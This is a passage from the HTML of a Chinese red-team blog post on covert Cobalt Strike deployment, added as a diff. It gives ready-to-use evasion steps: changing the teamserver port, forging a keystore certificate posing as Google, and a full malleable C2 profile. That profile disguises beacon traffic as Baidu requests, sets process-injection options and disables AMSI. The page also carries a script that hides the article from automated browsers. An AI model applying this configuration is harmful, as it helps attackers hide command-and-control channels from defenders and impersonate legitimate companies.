@@ -1,0 +1,488 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Cobalt Strike 隐蔽部署与流量转发实战 | kenny's blog</title><meta name="author" content="Kenny"><meta name="copyright" content="Kenny"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="f6f7f9"><meta name="description" content="Cobalt Strike 特征抹除Cobalt Strike 作为主流的 C2 框架，其默认配置存在大量可被检测的特征。在实战中，必须对这些特征进行深度定制，才能有效对抗蓝队的流量分析和威胁情报检测。 端口修改默认端口风险Cobalt Strike 默认使用 50050 端口作为团队服务器端口，这是一个明显的指纹特征。蓝队可以通过端口扫描快速定位 CS 服务器。 修改方法编辑 teamserve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike 隐蔽部署与流量转发实战">
+<meta property="og:url" content="https://www.52jl.top/2026/02/13/cs1/index.html">
+<meta property="og:site_name" content="kenny&#39;s blog">
+<meta property="og:description" content="Cobalt Strike 特征抹除Cobalt Strike 作为主流的 C2 框架，其默认配置存在大量可被检测的特征。在实战中，必须对这些特征进行深度定制，才能有效对抗蓝队的流量分析和威胁情报检测。 端口修改默认端口风险Cobalt Strike 默认使用 50050 端口作为团队服务器端口，这是一个明显的指纹特征。蓝队可以通过端口扫描快速定位 CS 服务器。 修改方法编辑 teamserve">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.52jl.top/img/covers/shinchan-cover-01.webp">
+<meta property="article:published_time" content="2026-02-13T08:11:58.997Z">
+<meta property="article:modified_time" content="2026-02-13T08:11:58.998Z">
+<meta property="article:author" content="Kenny">
+<meta property="article:tag" content="Cobalt Strike">
+<meta property="article:tag" content="Nginx">
+<meta property="article:tag" content="RedGuard">
+<meta property="article:tag" content="流量转发">
+<meta property="article:tag" content="重定向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.52jl.top/img/covers/shinchan-cover-01.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cobalt Strike 隐蔽部署与流量转发实战",
+  "url": "https://www.52jl.top/2026/02/13/cs1/",
+  "image": "https://www.52jl.top/img/covers/shinchan-cover-01.webp",
+  "datePublished": "2026-02-13T08:11:58.997Z",
+  "dateModified": "2026-02-13T08:11:58.998Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Kenny",
+      "url": "https://www.52jl.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://www.52jl.top/2026/02/13/cs1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Cobalt Strike 隐蔽部署与流量转发实战',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="/css/custom.css?v=20260213b"><meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex,max-snippet:0,max-image-preview:none,max-video-preview:0">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+<script>
+(() => {
+  try {
+    const isAutomation = navigator.webdriver || /HeadlessChrome|PhantomJS|puppeteer|playwright/i.test(navigator.userAgent || '');
+    if (!isAutomation) return;
+    const selectors = ['#article-container', 'article', '.post-content', '.post-body'];
+    selectors.forEach((s) => {
+      document.querySelectorAll(s).forEach((el) => {
+        el.innerHTML = '<p>Content unavailable.</p>';
+      });
+    });
+  } catch (e) {}
+})();
+</script>
+<meta name="referrer" content="no-referrer">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self' https: data: blob:; script-src 'self' https: 'unsafe-inline' 'unsafe-eval'; style-src 'self' https: 'unsafe-inline'; img-src 'self' https: data: blob:; font-src 'self' https: data:; connect-src 'self' https:; object-src 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests">
+<script>
+(() => {
+  try {
+    if (window.top !== window.self) {
+      window.top.location = window.self.location.href;
+      return;
+    }
+
+    const host = window.location.hostname;
+    const isLocal = host === 'localhost' || host === '127.0.0.1';
+    if (!isLocal && window.location.protocol === 'http:') {
+      window.location.replace('https://' + window.location.host + window.location.pathname + window.location.search + window.location.hash);
+    }
+  } catch (e) {}
+})();
+</script>
+</head><body><div class="bg-animation" id="web_bg" style="background-color: #f6f7f9;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">kenny's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Cobalt Strike 隐蔽部署与流量转发实战</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-house-signal"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-box-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-toolbox"></i><span> Tools</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tools/url-extractor/"><i class="fa-fw fas fa-filter"></i><span> IP/域名/URL 提取</span></a></li><li><a class="site-page child" href="/tools/password-dict/"><i class="fa-fw fas fa-key"></i><span> 密码字典生成</span></a></li><li><a class="site-page child" href="/tools/av-detector/"><i class="fa-fw fas fa-shield-virus"></i><span> 杀软识别</span></a></li><li><a class="site-page child" href="/tools/shell-command/"><i class="fa-fw fas fa-terminal"></i><span> 命令编码工具</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout hide-aside" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Cobalt Strike 隐蔽部署与流量转发实战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-02-13T08:11:58.997Z" title="发表于 2026-02-13 16:11:58">2026-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-02-13T08:11:58.998Z" title="更新于 2026-02-13 16:11:58">2026-02-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></span></div><div class="meta-secondline"></div></div></div><article class="container post-content" id="article-container"><h1 id="Cobalt-Strike-特征抹除"><a href="#Cobalt-Strike-特征抹除" class="headerlink" title="Cobalt Strike 特征抹除"></a>Cobalt Strike 特征抹除</h1><p>Cobalt Strike 作为主流的 C2 框架，其默认配置存在大量可被检测的特征。在实战中，必须对这些特征进行深度定制，才能有效对抗蓝队的流量分析和威胁情报检测。</p>
+<h2 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h2><h3 id="默认端口风险"><a href="#默认端口风险" class="headerlink" title="默认端口风险"></a>默认端口风险</h3><p>Cobalt Strike 默认使用 <strong>50050</strong> 端口作为团队服务器端口，这是一个明显的指纹特征。蓝队可以通过端口扫描快速定位 CS 服务器。</p>
+<h3 id="修改方法"><a href="#修改方法" class="headerlink" title="修改方法"></a>修改方法</h3><p>编辑 <code>teamserver</code> 文件，修改默认端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 找到以下行</span></span><br><span class="line">server_port=50050</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改为随机高位端口</span></span><br><span class="line">server_port=23456</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/10.webp" loading='lazy'></p>
+<p><strong>推荐端口选择策略</strong>：</p>
+<ul>
+<li>避免使用常见端口（80、443、8080、50050 等）</li>
+<li>选择 10000-65535 范围内的随机端口</li>
+<li>伪装成常见服务端口（如 3306 伪装 MySQL、5432 伪装 PostgreSQL）</li>
+<li>配合防火墙规则，只允许特定 IP 访问</li>
+</ul>
+<hr>
+<h2 id="证书特征修改"><a href="#证书特征修改" class="headerlink" title="证书特征修改"></a>证书特征修改</h2><h3 id="默认证书分析"><a href="#默认证书分析" class="headerlink" title="默认证书分析"></a>默认证书分析</h3><p>CS 默认使用自签名证书，包含明显的 <code>cobaltstrike</code> 特征字符串。使用以下命令查看证书信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br><span class="line"><span class="comment"># 默认密码：123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/11.webp" loading='lazy'></p>
+<p><strong>默认证书特征</strong>：</p>
+<ul>
+<li><strong>别名（Alias）</strong>：cobaltstrike</li>
+<li><strong>所有者（Owner）</strong>：CN&#x3D;Major Cobalt Strike, OU&#x3D;AdvancedPenTesting, O&#x3D;cobaltstrike, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;Earth</li>
+<li><strong>颁发者（Issuer）</strong>：与所有者相同</li>
+<li><strong>有效期</strong>：固定时间范围</li>
+</ul>
+<p>这些特征可以被 SSL&#x2F;TLS 指纹识别工具（如 JARM、JA3）检测。</p>
+<hr>
+<h3 id="生成自定义证书"><a href="#生成自定义证书" class="headerlink" title="生成自定义证书"></a>生成自定义证书</h3><p>使用 <code>keytool</code> 生成伪装证书，模拟合法组织：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 \</span><br><span class="line">  -genkey -keyalg RSA -<span class="built_in">alias</span> google.com \</span><br><span class="line">  -dname <span class="string">&quot;CN=*.google.com, OU=Google LLC, O=Google, L=Mountain View, ST=California, C=US&quot;</span> \</span><br><span class="line">  -validity 3650</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/12.webp" loading='lazy'></p>
+<p><strong>参数说明</strong>：</p>
+<ul>
+<li><code>-alias</code>：证书别名，建议使用目标域名</li>
+<li><code>-dname</code>：证书主题信息<ul>
+<li><code>CN</code>：通用名称（域名）</li>
+<li><code>OU</code>：组织单位</li>
+<li><code>O</code>：组织名称</li>
+<li><code>L</code>：城市</li>
+<li><code>ST</code>：州&#x2F;省</li>
+<li><code>C</code>：国家代码</li>
+</ul>
+</li>
+<li><code>-validity</code>：有效期（天数），建议设置为 3650（10 年）</li>
+</ul>
+<p><strong>验证修改结果</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/13.webp" loading='lazy'></p>
+<p><strong>进阶技巧</strong>：</p>
+<ol>
+<li><strong>克隆真实证书</strong>：使用 <code>openssl</code> 提取目标网站的证书信息，生成高仿证书</li>
+<li><strong>使用合法 CA 证书</strong>：购买或申请免费 SSL 证书（Let’s Encrypt），替换自签名证书</li>
+<li><strong>证书链伪造</strong>：构造完整的证书链，提高可信度</li>
+</ol>
+<hr>
+<h2 id="C2-Profile-流量混淆"><a href="#C2-Profile-流量混淆" class="headerlink" title="C2 Profile 流量混淆"></a>C2 Profile 流量混淆</h2><h3 id="默认流量特征分析"><a href="#默认流量特征分析" class="headerlink" title="默认流量特征分析"></a>默认流量特征分析</h3><p>未使用 Profile 文件时，CS 的流量存在明显特征：</p>
+<p><strong>抓包过滤规则</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == &quot;POST&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/02/13/cs1/15.webp" loading='lazy'></p>
+<p><strong>默认流量特征</strong>：</p>
+<ul>
+<li><strong>URI 路径</strong>：<code>/submit.php</code>、<code>/__utm.gif</code> 等固定路径</li>
+<li><strong>User-Agent</strong>：<code>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)</code></li>
+<li><strong>Cookie 格式</strong>：固定的 Base64 编码格式</li>
+<li><strong>POST 数据</strong>：未加密的 Beacon 元数据</li>
+<li><strong>响应头</strong>：固定的 <code>Content-Type: application/octet-stream</code></li>
+</ul>
+<p><img src="/2026/02/13/cs1/16.webp" loading='lazy'></p>
+<p>这些特征可以被 IDS&#x2F;IPS（如 Snort、Suricata）和 NDR（网络检测与响应）系统轻松识别。</p>
+<hr>
+<h3 id="自定义-C2-Profile"><a href="#自定义-C2-Profile" class="headerlink" title="自定义 C2 Profile"></a>自定义 C2 Profile</h3><p>C2 Profile 是 CS 的流量配置文件，可以完全自定义 HTTP&#x2F;HTTPS 通信的各个方面。</p>
+<p><strong>示例 Profile（伪装百度流量）</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"># 全局配置</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;5000&quot;</span>;           # Beacon 心跳间隔（毫秒）</span><br><span class="line"><span class="built_in">set</span> jitter <span class="string">&quot;20&quot;</span>;                # 心跳抖动（<span class="number">0</span><span class="number">-99</span>%）</span><br><span class="line"><span class="built_in">set</span> maxdns <span class="string">&quot;255&quot;</span>;               # DNS Beacon 最大主机名长度</span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36&quot;</span>;</span><br><span class="line"></span><br><span class="line"># HTTP GET 请求配置（Beacon 拉取任务）</span><br><span class="line">http-get &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/s?wd=test&amp;rsv_spt=1&quot;</span>;  # 伪装成百度搜索</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Accept-Language&quot;</span> <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;www.baidu.com&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Referer&quot;</span> <span class="string">&quot;https://www.baidu.com/&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line"></span><br><span class="line">        # Beacon 元数据编码</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64url;                    # Base64 URL 安全编码</span><br><span class="line">            prepend <span class="string">&quot;BAIDUID=&quot;</span>;           # 伪装成百度 Cookie</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;              # 放入 Cookie 头</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;BWS/1.1&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;text/html;charset=utf-8&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Cache-Control&quot;</span> <span class="string">&quot;private&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Set-Cookie&quot;</span> <span class="string">&quot;BAIDUID=xxx:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; path=/; domain=.baidu.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;                        # 直接返回数据</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># HTTP POST 请求配置（Beacon 上传结果）</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/v2/api/report&quot;</span>;             # 伪装成 API 接口</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Host&quot;</span> <span class="string">&quot;hm.baidu.com&quot;</span>;     # 伪装百度统计</span><br><span class="line"></span><br><span class="line">        # Beacon ID 编码</span><br><span class="line">        id &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            parameter <span class="string">&quot;id&quot;</span>;               # 放入 URL 参数</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 命令输出编码</span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;nginx&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/json&quot;</span>;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># HTTPS 证书配置</span><br><span class="line">https-certificate &#123;</span><br><span class="line">    <span class="built_in">set</span> CN       <span class="string">&quot;*.baidu.com&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> O        <span class="string">&quot;Beijing Baidu Netcom Science Technology Co., Ltd&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> C        <span class="string">&quot;CN&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> L        <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> OU       <span class="string">&quot;service operation department&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> ST       <span class="string">&quot;Beijing&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> validity <span class="string">&quot;3650&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 代码签名证书（可选）</span><br><span class="line">code-signer &#123;</span><br><span class="line">    <span class="built_in">set</span> keystore <span class="string">&quot;keystore.jks&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> password <span class="string">&quot;password&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> alias    <span class="string">&quot;server&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># DNS Beacon 配置</span><br><span class="line">dns-beacon &#123;</span><br><span class="line">    <span class="built_in">set</span> dns_idle             <span class="string">&quot;8.8.8.8&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_max_txt          <span class="string">&quot;252&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_sleep            <span class="string">&quot;0&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_ttl              <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> maxdns               <span class="string">&quot;255&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_prepend   <span class="string">&quot;.stage.&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> dns_stager_subhost   <span class="string">&quot;.cdn.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 进程注入配置</span><br><span class="line">process-inject &#123;</span><br><span class="line">    <span class="built_in">set</span> startrwx <span class="string">&quot;false&quot;</span>;                 # 不使用 RWX 内存</span><br><span class="line">    <span class="built_in">set</span> userwx   <span class="string">&quot;false&quot;</span>;                 # 不使用 RW-&gt;RX 转换</span><br><span class="line"></span><br><span class="line">    transform-x86 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90&quot;</span>;               # NOP 填充</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    transform-x64 &#123;</span><br><span class="line">        prepend <span class="string">&quot;\x90\x90&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execute &#123;</span><br><span class="line">        CreateThread <span class="string">&quot;ntdll.dll!RtlUserThreadStart&quot;</span>;</span><br><span class="line">        SetThreadContext;</span><br><span class="line">        CreateRemoteThread;</span><br><span class="line">        RtlCreateUserThread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 后渗透任务配置</span><br><span class="line">post-ex &#123;</span><br><span class="line">    <span class="built_in">set</span> spawnto_x86 <span class="string">&quot;%windir%\\syswow64\\rundll32.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> spawnto_x64 <span class="string">&quot;%windir%\\sysnative\\rundll32.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> obfuscate <span class="string">&quot;true&quot;</span>;                 # 混淆后渗透 DLL</span><br><span class="line">    <span class="built_in">set</span> smartinject <span class="string">&quot;true&quot;</span>;               # 智能注入</span><br><span class="line">    <span class="built_in">set</span> amsi_disable <span class="string">&quot;true&quot;</span>;              # 禁用 AMSI</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Profile 语法检查</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint your_profile.profile</span><br></pre></td></tr></table></figure>
+
+<p>如果输出 <code>[+] Profile compiled OK</code>，说明语法正确。</p>
+<hr>
